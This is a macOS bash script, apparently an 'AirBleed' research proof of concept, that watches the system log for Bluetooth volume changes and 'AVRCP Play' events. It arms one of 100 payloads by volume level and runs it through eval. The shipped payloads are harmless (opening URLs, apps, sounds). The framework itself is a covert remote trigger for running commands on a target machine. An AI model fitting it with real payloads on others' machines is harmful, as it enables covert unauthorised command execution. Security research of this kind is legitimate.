#!/bin/bash

# _______   __                            __            __       __                                  __                         
#|       \ |  \                          |  \          |  \     /  \                                |  \                        
#| $$$$$$$\| $$  ______    ______    ____| $$ __    __ | $$\   /  $$  ______   _______    _______  _| $$_     ______    ______  
#| $$__/ $$| $$ /      \  /      \  /      $$|  \  |  \| $$$\ /  $$$ /      \ |       \  /       \|   $$ \   /      \  /      \ 
#| $$    $$| $$|  $$$$$$\|  $$$$$$\|  $$$$$$$| $$  | $$| $$$$\  $$$$|  $$$$$$\| $$$$$$$\|  $$$$$$$ \$$$$$$  |  $$$$$$\|  $$$$$$\
#| $$$$$$$\| $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$\$$ $$ $$| $$  | $$| $$  | $$ \$$    \   | $$ __ | $$    $$| $$   \$$
#| $$__/ $$| $$| $$__/ $$| $$__/ $$| $$__| $$| $$__/ $$| $$ \$$$| $$| $$__/ $$| $$  | $$ _\$$$$$$\  | $$|  \| $$$$$$$$| $$      
#| $$    $$| $$ \$$    $$ \$$    $$ \$$    $$ \$$    $$| $$  \$ | $$ \$$    $$| $$  | $$|       $$   \$$  $$ \$$     \| $$      
# \$$$$$$$  \$$  \$$$$$$   \$$$$$$   \$$$$$$$ _\$$$$$$$ \$$      \$$  \$$$$$$  \$$   \$$ \$$$$$$$     \$$$$   \$$$$$$$ \$$      
#                                            |  \__| $$                                                                         
#                                             \$$    $$                                                                         
#                                              \$$$$$$                                                                          


# BloodyMonster aka 17 Bloody Bullets - macOS Version (Tested on macOS i5 & Apple M1)
# Author: Ray Cervantes aka $pill_bl**d
# nobloodyregrets@gmail.com
# www.linkedin.com/in/raycervantes
# For Research/Educational/Art Purposes Only If Cited Correctly
# Any Commercial Use is a Violation of United States Laws & Bleed No Evil
# Created Labor Day Weekend 2025 
# AirBleed 📡🩸 Proof of Concept Prototypes: BloodyPods & BloodyMonster
# Presented at DEF CON 33 Demo Labs - AirBleed: Covert Bluetooth Plist Injection
# © 2025 Ray Cervantes. AirBleed™, BloodyMonster™, and BloodyPods™ are covered by a provisional patent application filed with the United States Patent and Trademark Office. Patent Pending. All rights reserved.

# Executes by Bluetooth, Wi-Fi, & Cellular. Satellite and other radios are untested as of 09/08/2025.
# Note: Payloads execute only AFTER "AVRCP Play" following a volume change
# Loading payload while audio playing requires a pause press then a play press again to execute payload (2x button press).
# Loading payload while audio paused requires a play/pause/play press to execute payload (3x button press).
# To run the same payload two or more times consecutively volume twist away from payload and back to payload must be performed to execute same payload again. 
# Payloads can also be executed by entering 'AVRCP Play' in name area of iOS device (iPhone, iPad) connected to iCloud of macOS target device or send bluetooth connection attempt to host/target from 
# user with AVRCP Play in name area. First name change to 'AVRCP Play' will execute payload but next name change to 'AVRCP Play' should add letters or numbers after to be logged in log 
# stream and execute payload as soon as name is changed (e.g. 'AVCRP Play Now').
# User can root in and run bloodymonster.sh on remote machine or bloodymonster.sh can run at startup.
# Sound must be played back on BloodyMonster Bluetooth device to register volume changes as payloads.
# Code may need to be altered to run on specific OS or file/folder system.
# Future Payloads, Payload pack ideas, and collaborations are welcome
# Run chmod +x bloodymonster.sh before starting
# Ctrl + C to exit

PRED='eventMessage CONTAINS "Volume changed to" || eventMessage CONTAINS "AVRCP Play" || eventMessage CONTAINS "Payload"'

current_index=0
total_payloads=100
loaded_payload=""
loaded_cmd=""

# Define payloads 0–99
# declare -A payloads
payloads[0]='echo "Payload Zero Activated. Welcome Operator"'
payloads[1]='open https://www.youtube.com/watch?v=dQw4w9WgXcQ'
payloads[2]='open https://www.artstation.com'
payloads[3]='afplay /System/Library/Sounds/Blow.aiff'
payloads[4]='osascript -e '\''display dialog "BloodyMonster Payload 4 Executed" buttons {"OK"}'\'''
payloads[5]='open -a Calculator'
payloads[6]='open https://www.gutenberg.org'
payloads[7]='open https://www.drive.google.com/drive/folders/1k_8HpTsfaWaRiXfYLmW7NJJ4sbjGp98U?usp=share_link'
payloads[8]='say "You have a message from Ray: check your console"'
payloads[9]='echo " (*_*) (*_*) "'

# Generate remaining payloads with simple echo commands
for i in $(seq 10 $((total_payloads-1))); do
  payloads[$i]="echo \"Payload $i executed at \$(date)\" >> ~/bloodymonster_log.txt"
done

# Function to load/arm payload (not execute yet)
arm_payload() {
  ts=$(date '+%Y-%m-%d %H:%M:%S')
  loaded_payload="Payload $current_index"
  loaded_cmd="${payloads[$current_index]}"
  echo "$ts  [ARMED] $loaded_payload → waiting for AVRCP Play"
}

# Function to execute loaded payload
execute_payload() {
  ts=$(date '+%Y-%m-%d %H:%M:%S')
  if [[ -n "$loaded_cmd" ]]; then
    echo "$ts  [EXECUTE] $loaded_payload"
    eval "$loaded_cmd" &
    loaded_payload=""
    loaded_cmd=""
  else
    echo "$ts  [INFO] AVRCP Play seen but no payload armed"
  fi
}

# Monitor log stream
/usr/bin/log stream --style syslog --info --predicate "$PRED" \
| while IFS= read -r line; do
  ts=$(date '+%Y-%m-%d %H:%M:%S')

  # Direct trigger if "Payload##" found in log
  if [[ "$line" =~ Payload([0-9]{1,3}) ]]; then
    num="${BASH_REMATCH[1]}"
    if (( num >= 0 && num < total_payloads )); then
      current_index=$num
      echo "$ts  [NEXT] Jumped to Payload $current_index"
      arm_payload
    fi
    continue
  fi

  # Volume → load/arm payloads by pre-defined mapping
  if [[ $line =~ Volume\ changed\ to\ ([0-9]+\.[0-9]+) ]]; then
    vol="${BASH_REMATCH[1]}"
    case "$vol" in
      "0.000000")    current_index=0 ;;
      "6.299212")    current_index=1 ;;
      "12.598425")   current_index=2 ;;
      "18.897638")   current_index=3 ;;
      "25.196850")   current_index=4 ;;
      "31.496063")   current_index=5 ;;
      "37.795277")   current_index=6 ;;
      "44.094486")   current_index=7 ;;
      "50.393700")   current_index=8 ;;
      "56.692917")   current_index=9 ;;
      "62.992126")   current_index=10 ;;
      "69.291344")   current_index=11 ;;
      "75.590553")   current_index=12 ;;
      "81.889763")   current_index=13 ;;
      "88.188972")   current_index=14 ;;
      "94.488190")   current_index=15 ;;
      "100.000000")  current_index=16 ;;
      *) continue ;;
    esac
    echo "$ts  [NEXT] Switched to Payload $current_index (Volume $vol)"
    arm_payload
    continue
  fi

  # AVRCP Play → execute payload
  if [[ "$line" == *"AVRCP Play"* ]]; then
    execute_payload
    continue
  fi
done
